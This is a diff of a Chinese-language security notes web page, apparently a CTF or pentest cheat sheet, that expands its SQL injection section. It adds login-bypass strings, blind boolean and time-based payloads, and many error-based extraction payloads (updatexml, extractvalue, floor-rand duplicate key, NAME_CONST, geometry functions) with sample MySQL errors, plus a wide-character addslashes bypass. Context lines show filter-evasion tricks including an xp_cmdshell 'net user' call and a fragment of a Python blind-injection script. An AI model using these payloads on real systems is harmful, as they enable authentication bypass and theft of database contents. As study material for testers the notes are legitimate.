@@ -415,15 +415,22 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_4" title="手工注入" class="md-nav__link">
-    手工注入
+  <a href="#bool" title="bool型注入" class="md-nav__link">
+    bool型注入
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#_5" title="延时注入" class="md-nav__link">
+  <a href="#_4" title="延时注入" class="md-nav__link">
     延时注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="报错注入" class="md-nav__link">
+    报错注入
   </a>
   
 </li>
@@ -585,8 +592,8 @@
 
 
   <li class="md-nav__item">
-    <a href="../upload/" title="Upload" class="md-nav__link">
-      Upload
+    <a href="../upload&parsing/" title="Upload&parsing" class="md-nav__link">
+      Upload&parsing
     </a>
   </li>
 
@@ -2601,15 +2608,22 @@
 </li>
         
           <li class="md-nav__item">
-  <a href="#_4" title="手工注入" class="md-nav__link">
-    手工注入
+  <a href="#bool" title="bool型注入" class="md-nav__link">
+    bool型注入
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#_5" title="延时注入" class="md-nav__link">
+  <a href="#_4" title="延时注入" class="md-nav__link">
     延时注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="报错注入" class="md-nav__link">
+    报错注入
   </a>
   
 </li>
@@ -2751,16 +2765,35 @@ database() 数据库名称
 system_user() 系统用户名
 current_user() 当前用户名
 session_user() 连接数据库的用户名
-floor() 取整
-rand() 随机0-1
 concat(&quot;abc&quot;,&quot;123&quot;)=abc123
 concat(&quot;abc&quot;,0x22,&quot;123&quot;)=abc&quot;123
 </pre></div></p>
 <h3 id="_3">万能密码<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
-<p><code>'or 1#</code><br />
-其他待补充 </p>
-<h3 id="_4">手工注入<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
-<div class="codehilite"><pre><span></span><span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">0</span><span class="p">));</span>
+<div class="codehilite"><pre><span></span>&#39;or 1# 
+admin&#39; --
+admin&#39; #
+admin&#39;/*
+&#39; or 1=1--
+&#39; or 1=1#
+&#39; or 1=1/*
+&#39;) or &#39;1&#39;=&#39;1--
+&#39;) or (&#39;1&#39;=&#39;1--
+以不同的用户登陆 &#39; UNION SELECT 1, &#39;anotheruser&#39;, &#39;doesnt matter&#39;, 1--
+</pre></div>
+
+<p>其他待补充 </p>
+<h3 id="bool">bool型注入<a class="headerlink" href="#bool" title="Permanent link">&para;</a></h3>
+<p>一般适用于无回显消息，但是错误的话，页面会不正确的情况，而延时注入适用于在sql语句错误时页面还正常的情况。  </p>
+<p>常用函数:
+- Length()函数 返回字符串的长度
+- Substr()截取字符串
+- Ascii()返回字符的ascii码
+- if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p>
+<h3 id="_4">延时注入<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><span class="p">(</span><span class="k">IF</span><span class="p">(</span><span class="n">MID</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span> <span class="k">LIKE</span> <span class="mi">5</span><span class="p">,</span> <span class="n">BENCHMARK</span><span class="p">(</span><span class="mi">100000</span><span class="p">,</span><span class="n">SHA1</span><span class="p">(</span><span class="s1">&#39;true&#39;</span><span class="p">)),</span> <span class="k">false</span><span class="p">))</span>
+<span class="c1">-- BENCHMARK()</span>
+
+<span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="k">length</span><span class="p">(</span><span class="o">@@</span><span class="k">version</span><span class="p">)</span><span class="o">=</span><span class="mi">6</span><span class="p">,</span><span class="mi">20</span><span class="p">,</span><span class="mi">0</span><span class="p">));</span>
 <span class="c1">--长度为6 sleep 2秒，否则0秒。</span>
 
 <span class="k">select</span> <span class="n">sleep</span><span class="p">(</span><span class="k">if</span><span class="p">(</span><span class="n">ord</span><span class="p">(</span><span class="n">mid</span><span class="p">((</span><span class="k">select</span> <span class="k">user</span><span class="p">()),</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span><span class="o">&lt;</span><span class="mi">150</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">2</span><span class="p">));</span>
@@ -2783,7 +2816,6 @@ concat(&quot;abc&quot;,0x22,&quot;123&quot;)=abc&quot;123
 <span class="c1">--函数让检索出来的语句以行的形式显示。如果不用这个函数，就不会看到输出结果。 </span>
 </pre></div>
 
-<h3 id="_5">延时注入<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
 <span class="kn">import</span> <span class="nn">string</span>
 
@@ -2804,6 +2836,52 @@ concat(&quot;abc&quot;,0x22,&quot;123&quot;)=abc&quot;123
 <span class="k">print</span> <span class="s2">&quot;result:&quot;</span><span class="o">+</span><span class="n">flag</span>
 </pre></div>
 
+<h3 id="_5">报错注入<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
+<p><div class="codehilite"><pre><span></span><span class="o">//</span> <span class="n">mysql</span><span class="o">&lt;</span><span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">47</span>
+<span class="k">select</span> <span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="o">!</span><span class="n">x</span><span class="o">-~</span><span class="mi">0</span><span class="p">)</span><span class="k">from</span><span class="p">(</span><span class="k">select</span><span class="p">(</span><span class="k">select</span> <span class="k">user</span><span class="p">())</span><span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">);</span>
+<span class="c1">--- ERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#39;((not(&#39;root@localhost&#39;)) - ~(0))&#39;</span>
+</pre></div>
+从mysql5.1.5开始提供两个<a href="https://dev.mysql.com/doc/refman/5.7/en/xml-functions.html">XML查询和修改的函数</a>，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容,它们的第二个参数都要求是符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里：</p>
+<div class="codehilite"><pre><span></span><span class="k">select</span> <span class="n">updatexml</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="o">@@</span><span class="k">version</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">),</span><span class="mi">1</span><span class="p">);</span>
+<span class="c1">--- ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span>
+<span class="k">select</span> <span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span> <span class="o">@@</span><span class="k">version</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">));</span>
+<span class="c1">--- ERROR 1105 (HY000): XPATH syntax error: &#39;~5.7.17~&#39;</span>
+</pre></div>
+
+<p>主键重复:实际上只要是count，rand()，group by三个连用就会造成这种报错，与位置无关,常见的payload
+<div class="codehilite"><pre><span></span><span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span> <span class="k">from</span> <span class="n">test</span> <span class="k">group</span> <span class="k">by</span> <span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">));</span>
+<span class="c1">-- ERROR 1062 (23000): Duplicate entry &#39;5.7.171&#39; for key &#39;&lt;group_key&gt;&#39;</span>
+<span class="k">select</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">group</span> <span class="k">by</span> <span class="n">x</span><span class="p">;</span>
+<span class="c1">-- ERROR 1062 (23000): Duplicate entry &#39;5.7.171&#39; for key &#39;&lt;group_key&gt;&#39;</span>
+
+
+<span class="c1">--- 查询数据库的个数：</span>
+<span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">count</span><span class="p">(</span><span class="k">schema_name</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span>
+<span class="c1">--- payload组合语句：</span>
+<span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(),</span><span class="n">concat</span><span class="p">((</span><span class="k">select</span> <span class="p">(</span><span class="k">select</span> <span class="p">(</span><span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">count</span><span class="p">(</span><span class="k">schema_name</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span><span class="p">))</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">group</span> <span class="k">by</span> <span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">)</span>
+
+<span class="c1">--- 获取数据库名字：</span>
+<span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">schema_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span>
+<span class="c1">---payload组合语句：</span>
+<span class="k">and</span> <span class="p">(</span><span class="k">select</span> <span class="mi">1</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">count</span><span class="p">(),</span><span class="n">concat</span><span class="p">((</span><span class="k">select</span> <span class="p">(</span><span class="k">select</span> <span class="p">(</span><span class="k">select</span> <span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">schema_name</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">)</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">schemata</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">))</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">limit</span> <span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span> <span class="k">from</span> <span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span> <span class="k">group</span> <span class="k">by</span> <span class="n">x</span><span class="p">)</span><span class="n">a</span><span class="p">)</span>
+</pre></div></p>
+<p>mysql列名重复会报错
+<div class="codehilite"><pre><span></span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="n">NAME_CONST</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">),</span><span class="n">NAME_CONST</span><span class="p">(</span><span class="k">version</span><span class="p">(),</span><span class="mi">1</span><span class="p">))</span><span class="n">x</span><span class="p">;</span>
+<span class="c1">--- ERROR 1060 (42S21): Duplicate column name &#39;5.7.17&#39;</span>
+
+<span class="k">select</span> <span class="o">*</span>  <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="n">a</span> <span class="k">join</span> <span class="n">test</span> <span class="n">b</span><span class="p">)</span><span class="k">c</span><span class="p">;</span>
+<span class="c1">--- ERROR 1060 (42S21): Duplicate column name &#39;id&#39;</span>
+<span class="k">select</span> <span class="o">*</span>  <span class="k">from</span><span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test</span> <span class="n">a</span> <span class="k">join</span> <span class="n">test</span> <span class="n">b</span> <span class="k">using</span><span class="p">(</span><span class="n">id</span><span class="p">))</span><span class="k">c</span><span class="p">;</span>
+<span class="c1">--- ERROR 1060 (42S21): Duplicate column name &#39;name&#39;</span>
+</pre></div>
+几何函数：<code>geometrycollection()</code>，<code>multipoint()</code>，<code>polygon()</code>，<code>multipolygon()</code>，<code>linestring()</code>，<code>multilinestring()</code>:
+<div class="codehilite"><pre><span></span><span class="c1">-- 5.5.47</span>
+<span class="k">select</span> <span class="n">multipoint</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">version</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">));</span>
+<span class="n">ERROR</span> <span class="mi">1367</span> <span class="p">(</span><span class="mi">22007</span><span class="p">):</span> <span class="n">Illegal</span> <span class="n">non</span> <span class="n">geometric</span> <span class="s1">&#39;(select `b`.`version()` from ((select &#39;</span><span class="mi">5</span><span class="p">.</span><span class="mi">5</span><span class="p">.</span><span class="mi">47</span><span class="s1">&#39; AS `version()` from dual) `b`))&#39;</span> <span class="n">value</span> <span class="k">found</span> <span class="n">during</span> <span class="n">parsing</span>
+<span class="c1">-- 5.7.17</span>
+<span class="k">select</span> <span class="n">multipoint</span><span class="p">((</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="p">(</span><span class="k">select</span> <span class="k">version</span><span class="p">())</span><span class="n">a</span><span class="p">)</span><span class="n">b</span><span class="p">));</span>
+<span class="c1">-- ERROR 1367 (22007): Illegal non geometric &#39;(select `a`.`version()` from ((select version() AS `version()`) `a`))&#39; value found during parsing</span>
+</pre></div></p>
 <h3 id="sqlmap">sqlmap<a class="headerlink" href="#sqlmap" title="Permanent link">&para;</a></h3>
 <p><code>-dbs -v 0  -dbs</code>, 根据不同的数据库管理平台探测包含的数据库名称  <br />
 <code>-D dvwa --tables</code> 根据数据库dvwa查找表名  <br />
@@ -2851,9 +2929,15 @@ newsid=60+a%nd%201=(se%lect%20@@servername)--
 <li>NULL字节
 <div class="codehilite"><pre><span></span>xx.asp?0day5.com=%00.&amp;xw_id=69%20 and 1=1和xx.asp?0day5.com=%00.&amp;xw_id=69%20 and 1=2
 </pre></div></li>
-<li>关键字拆分
+<li>
+<p>关键字拆分
 <div class="codehilite"><pre><span></span>cnseay.com/1.aspx?id=1;EXEC(&#39;ma&#39;+&#39;ster..x&#39;+&#39;p_cm&#39;+&#39;dsh&#39;+&#39;ell &quot;net user&quot;&#39;)
-</pre></div></li>
+</pre></div></p>
+</li>
+<li>
+<p>宽字符注入<br />
+这种方式主要是绕过 addslashes 等对特殊字符进行转移的绕过。反斜杠  的十六进制为 %5c，在你输入 %bf%27 时，函数遇到单引号自动转移加入 \，此时变为 %bf%5c%27，%bf%5c 在 GBK 中变为一个宽字符「縗」。%bf 那个位置可以是 %81-%fe 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。</p>
+</li>
 </ol>
 <h3 id="sqlmap-tamper">sqlmap 自带的绕过脚本 --tamper详解<a class="headerlink" href="#sqlmap-tamper" title="Permanent link">&para;</a></h3>
 <div class="codehilite"><pre><span></span>(1) apostrophemask.py UTF-8编码 
@@ -3074,11 +3158,6 @@ sel%00ect,%20=&gt;空格,/!**/ =&gt; 空格 异常method，<code>~ ！+ -</code>
 <h3 id="_8">截断<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
 <p>username=a'+0;%00&amp;password=</p>
 <h2 id="_9">其他<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
-<ol>
-<li>域传送:dnsenum -enum xxx.com 检测域传送</li>
-<li><a href="http://www.dmzlab.com/77396.html">http://www.dmzlab.com/77396.html</a>  </li>
-<li>宽字符注入：'aaa%df' WHERE 1=1 --' </li>
-</ol>
                 
                   
                 
